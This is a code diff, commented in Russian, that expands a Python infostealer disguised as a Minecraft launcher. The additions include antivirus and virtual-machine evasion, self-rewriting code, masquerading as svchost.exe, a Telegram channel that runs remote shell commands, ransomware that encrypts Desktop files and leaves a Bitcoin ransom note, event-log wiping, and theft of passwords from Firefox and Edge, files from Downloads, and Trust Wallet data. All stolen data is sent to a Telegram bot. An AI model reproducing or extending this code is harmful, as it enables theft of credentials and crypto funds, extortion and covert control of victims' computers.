@@ -20,6 +20,8 @@ import pyautogui
 import keyboard
 import winreg
 import glob
+import string
+import ctypes
 
 # Настройки
 MINECRAFT_PATH = "C:\\Program Files (x86)\\Minecraft Launcher\\MinecraftLauncher.exe"
@@ -37,6 +39,15 @@ if not os.path.exists(LOG_DIR):
 logging.basicConfig(filename=LOG_FILE, level=logging.INFO, 
                     format='%(asctime)s - %(levelname)s - %(message)s')
 
+# Антианализ: проверка антивирусов
+def check_antivirus():
+    av_processes = ["avp.exe", "msmpeng.exe", "norton.exe", "mcafee.exe", "avg.exe"]
+    for process in psutil.process_iter(['name']):
+        if process.info['name'].lower() in av_processes:
+            logging.warning("Обнаружен антивирус, завершаю работу!")
+            return True
+    return False
+
 # Антидетект: проверка на виртуальную машину
 def is_vm():
     suspicious_processes = ["vboxservice.exe", "vmtoolsd.exe", "qemu-ga.exe"]
@@ -49,16 +60,42 @@ def is_vm():
         return True
     return False
 
+# Полиморфизм: изменяем код скрипта
+def polymorph_script():
+    try:
+        with open(__file__, "r", encoding="utf-8") as f:
+            code = f.readlines()
+        # Меняем имена переменных
+        for i, line in enumerate(code):
+            if "TEMP_DIR" in line:
+                new_name = ''.join(random.choices(string.ascii_letters, k=10))
+                code[i] = line.replace("TEMP_DIR", new_name)
+        # Перезаписываем файл
+        new_file = f"launcher_{random.randint(1000, 9999)}.py"
+        with open(new_file, "w", encoding="utf-8") as f:
+            f.writelines(code)
+        subprocess.Popen(["python", new_file], creationflags=subprocess.DETACHED_PROCESS)
+        logging.info("Скрипт полиморфно изменён")
+        os._exit(0)
+    except Exception as e:
+        logging.error(f"Ошибка полиморфизма: {str(e)}")
+
 # Маскировка: переименовываем процесс
 def mask_process():
     try:
-        # Копируем скрипт под видом системного процесса
         fake_path = os.path.join(os.environ["TEMP"], "svchost.exe")
         shutil.copyfile(__file__, fake_path)
         subprocess.Popen(fake_path, creationflags=subprocess.DETACHED_PROCESS)
         logging.info("Процесс замаскирован под svchost.exe")
     except Exception as e:
         logging.error(f"Ошибка маскировки: {str(e)}")
+
+# Спам-процессы для отвлечения
+def spam_processes():
+    for _ in range(5):
+        subprocess.Popen("notepad.exe", creationflags=subprocess.DETACHED_PROCESS)
+        time.sleep(0.1)
+    logging.info("Запущены отвлекающие процессы")
 
 # Автозапуск
 def add_to_startup():
@@ -86,6 +123,49 @@ def send_to_telegram(message, file_path=None):
             files = {"document": f}
             data = {"chat_id": TELEGRAM_CHAT_ID}
             requests.post(url, files=files, data=data)
+
+# Функция для получения команд из Telegram
+def check_telegram_commands():
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
+    response = requests.get(url).json()
+    if response["result"]:
+        last_message = response["result"][-1]["message"]["text"]
+        if last_message.startswith("/cmd"):
+            command = last_message.replace("/cmd ", "")
+            logging.info(f"Получена команда: {command}")
+            result = subprocess.check_output(command, shell=True).decode(errors="ignore")
+            send_to_telegram(f"Результат команды:\n{result}")
+        elif last_message == "/encrypt_files":
+            encrypt_files()
+            send_to_telegram("Файлы зашифрованы!")
+
+# Функция для шифрования файлов жертвы (рансомвар)
+def encrypt_files():
+    desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")
+    for root, _, files in os.walk(desktop_path):
+        for file in files:
+            if file.endswith((".txt", ".doc", ".png")):
+                file_path = os.path.join(root, file)
+                try:
+                    with open(file_path, "rb") as f:
+                        data = f.read()
+                    encrypted_data = CIPHER.encrypt(data)
+                    with open(file_path, "wb") as f:
+                        f.write(encrypted_data)
+                    logging.info(f"Зашифрован файл: {file_path}")
+                except:
+                    pass
+    with open(os.path.join(desktop_path, "README.txt"), "w") as f:
+        f.write("Ваши файлы зашифрованы! Отправьте 0.1 BTC для расшифровки.")
+
+# Функция для уничтожения следов
+def clear_traces():
+    try:
+        subprocess.run("wevtutil cl System", shell=True)
+        subprocess.run("wevtutil cl Application", shell=True)
+        logging.info("Системные логи очищены")
+    except:
+        pass
 
 # Функция для сбора системной информации
 def get_system_info():
@@ -124,6 +204,56 @@ def steal_chrome_passwords():
     except Exception as e:
         logging.error(f"Ошибка при краже паролей: {str(e)}")
         return f"Ошибка при краже паролей: {str(e)}"
+
+# Функция для кражи паролей из Firefox
+def steal_firefox_passwords():
+    try:
+        firefox_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
+        profile = [d for d in os.listdir(firefox_path) if d.endswith(".default-release")][0]
+        logins_path = os.path.join(firefox_path, profile, "logins.json")
+        
+        with open(logins_path, "r") as f:
+            data = json.load(f)
+        
+        passwords = []
+        for login in data["logins"]:
+            url = login["hostname"]
+            username = login["encryptedUsername"]
+            password = login["encryptedPassword"]
+            passwords.append(f"URL: {url}\nUsername: {username}\nPassword: {password}\n---")
+        
+        logging.info(f"Украдено {len(passwords)} паролей из Firefox")
+        return "\n".join(passwords) if passwords else "Пароли Firefox не найдены"
+    except Exception as e:
+        logging.error(f"Ошибка при краже паролей Firefox: {str(e)}")
+        return f"Ошибка: {str(e)}"
+
+# Функция для кражи паролей из Edge
+def steal_edge_passwords():
+    try:
+        edge_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
+        temp_db = os.path.join(TEMP_DIR, "EdgeLoginData")
+        shutil.copyfile(edge_path, temp_db)
+
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+        
+        passwords = []
+        for row in cursor.fetchall():
+            url, username, encrypted_password = row
+            if not username or not encrypted_password:
+                continue
+            password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
+            passwords.append(f"URL: {url}\nUsername: {username}\nPassword: {password}\n---")
+        
+        conn.close()
+        os.remove(temp_db)
+        logging.info(f"Украдено {len(passwords)} паролей из Edge")
+        return "\n".join(passwords) if passwords else "Пароли Edge не найдены"
+    except Exception as e:
+        logging.error(f"Ошибка при краже паролей Edge: {str(e)}")
+        return f"Ошибка: {str(e)}"
 
 # Функция для кражи cookies из Chrome
 def steal_chrome_cookies():
@@ -194,16 +324,17 @@ def keylogger():
             except:
                 pass
         keyboard.on_press(on_press)
-        time.sleep(60)  # Логируем 60 секунд
+        time.sleep(120)  # Логируем 120 секунд
         keyboard.unhook_all()
     logging.info("Запись клавиш завершена")
     return log_file
 
 # Функция для поиска и кражи файлов
-def steal_files(extensions=[".txt", ".png", ".jpg", ".pdf"]):
+def steal_files(extensions=[".txt", ".png", ".jpg", ".pdf", ".docx"]):
     desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")
     documents_path = os.path.join(os.environ["USERPROFILE"], "Documents")
-    paths = [desktop_path, documents_path]
+    downloads_path = os.path.join(os.environ["USERPROFILE"], "Downloads")
+    paths = [desktop_path, documents_path, downloads_path]
     stolen_files = []
     for path in paths:
         for root, _, files in os.walk(path):
@@ -216,19 +347,30 @@ def steal_files(extensions=[".txt", ".png", ".jpg", ".pdf"]):
     logging.info(f"Украдено {len(stolen_files)} файлов")
     return stolen_files
 
-# Функция для кражи данных криптокошельков (пример для MetaMask)
+# Функция для кражи данных криптокошельков (MetaMask и Trust Wallet)
 def steal_crypto_wallets():
+    wallets = []
     try:
+        # MetaMask
         metamask_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
         if os.path.exists(metamask_path):
             temp_wallet = os.path.join(TEMP_DIR, "metamask_data.zip")
             shutil.make_archive(temp_wallet.replace(".zip", ""), "zip", metamask_path)
+            wallets.append(temp_wallet)
             logging.info("Украдены данные MetaMask")
-            return temp_wallet
-        return None
+
+        # Trust Wallet
+        trust_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "ibnejdfjmmkpcnlpebklmnkoeoihofec")
+        if os.path.exists(trust_path):
+            temp_trust = os.path.join(TEMP_DIR, "trustwallet_data.zip")
+            shutil.make_archive(temp_trust.replace(".zip", ""), "zip", trust_path)
+            wallets.append(temp_trust)
+            logging.info("Украдены данные Trust Wallet")
+        
+        return wallets
     except Exception as e:
         logging.error(f"Ошибка при краже криптокошельков: {str(e)}")
-        return None
+        return []
 
 # Функция для запуска Minecraft (маскировка)
 def launch_minecraft():
@@ -245,14 +387,16 @@ def is_minecraft_running():
 
 # Основная функция
 def main():
-    # Проверка на ВМ
-    if is_vm():
-        send_to_telegram("🚨 Обнаружена виртуальная машина, завершаю работу!")
+    # Проверка на антивирус и ВМ
+    if check_antivirus() or is_vm():
+        send_to_telegram("🚨 Обнаружен антивирус или ВМ, завершаю работу!")
         return
 
-    # Маскировка и автозапуск
+    # Полиморфизм, маскировка и автозапуск
+    polymorph_script()
     mask_process()
     add_to_startup()
+    spam_processes()
 
     # Запускаем Minecraft для маскировки
     launch_minecraft()
@@ -265,17 +409,36 @@ def main():
     
     threads = []
     
+    # Проверка команд из Telegram (в отдельном потоке)
+    def telegram_listener():
+        while True:
+            check_telegram_commands()
+            time.sleep(10)
+    threads.append(threading.Thread(target=telegram_listener, daemon=True))
+
     # Системная информация
     def send_system_info():
         system_info = get_system_info()
         send_to_telegram("💻 Системная информация:\n" + system_info)
     threads.append(threading.Thread(target=send_system_info))
 
-    # Кража паролей
-    def send_passwords():
+    # Кража паролей из Chrome
+    def send_chrome_passwords():
         passwords = steal_chrome_passwords()
         send_to_telegram("🔑 Пароли из Chrome:\n" + passwords)
-    threads.append(threading.Thread(target=send_passwords))
+    threads.append(threading.Thread(target=send_chrome_passwords))
+
+    # Кража паролей из Firefox
+    def send_firefox_passwords():
+        passwords = steal_firefox_passwords()
+        send_to_telegram("🦊 Пароли из Firefox:\n" + passwords)
+    threads.append(threading.Thread(target=send_firefox_passwords))
+
+    # Кража паролей из Edge
+    def send_edge_passwords():
+        passwords = steal_edge_passwords()
+        send_to_telegram("🌐 Пароли из Edge:\n" + passwords)
+    threads.append(threading.Thread(target=send_edge_passwords))
 
     # Кража cookies
     def send_cookies():
@@ -310,8 +473,8 @@ def main():
 
     # Кража криптокошельков
     def send_wallets():
-        wallet = steal_crypto_wallets()
-        if wallet:
+        wallets = steal_crypto_wallets()
+        for wallet in wallets:
             send_to_telegram("💰 Найден криптокошелёк!", file_path=wallet)
     threads.append(threading.Thread(target=send_wallets))
 
@@ -319,9 +482,11 @@ def main():
     for thread in threads:
         thread.start()
     for thread in threads:
-        thread.join()
+        if not thread.daemon:
+            thread.join()
 
     # Очистка следов
+    clear_traces()
     shutil.rmtree(TEMP_DIR, ignore_errors=True)
     logging.info("Следы очищены")
 
